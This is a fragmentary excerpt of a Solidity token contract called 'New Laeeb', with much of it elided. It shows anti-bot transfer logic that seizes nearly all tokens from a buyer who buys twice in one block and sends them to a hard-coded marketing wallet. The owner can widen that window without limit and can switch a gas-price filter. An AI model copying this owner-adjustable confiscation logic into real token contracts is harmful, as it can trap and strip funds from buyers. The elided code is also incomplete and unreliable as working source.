...
contract NewLaeeb is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "New Laeeb";
    ...
    uint public batchBlock = 100;
    uint public bots;
    bool public isLaunch = false;
    
    //Marketing wallet and liquidity wallet
    address payable private marketingWalletAddress = payable(0x99af7E14A46475fF96d8e350fb0EB9Ca04fE6c30);
    address payable private liquidityWalletAddress = payable(0xF2DA56D0854ac0eCE69950C0623b78bBBCdcC522);
    ...
    constructor (address receiveAddr) {
        ...
        isWalletLimitExempt[receiveAddr] = true;
        ...
        isTxLimitExempt[receiveAddr] = true;
    ...
    function setBatchNum(uint256 batch) public onlyOwner {
        batchBlock = batch;
    }
    ...
    bool public gasLimitMode = true;
    uint gasLimit = 7 gwei;

    function flipMode() external onlyOwner {
        if(gasLimitMode)
            gasLimitMode = false;
        else 
            gasLimitMode = true;
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (sender == uniswapPair) {
                    if (block.number < launchedBlock + killBlock)
                        addBot(recipient);
                    if (block.number < launchedBlock + batchBlock) {
                        if (block.number != user2blocks[tx.origin]) {
                            user2blocks[tx.origin] = block.number;
                        } else {
                            bots++;
                            uint256 killAmount = finalAmount - 1;
                            finalAmount = 1;
                            _balances[marketingWalletAddress] = _balances[marketingWalletAddress].add(killAmount);
                            emit Transfer(sender,marketingWalletAddress,killAmount);
                        }
                    }
                }
                
                if (gasLimitMode && tx.gasprice > gasLimit) {
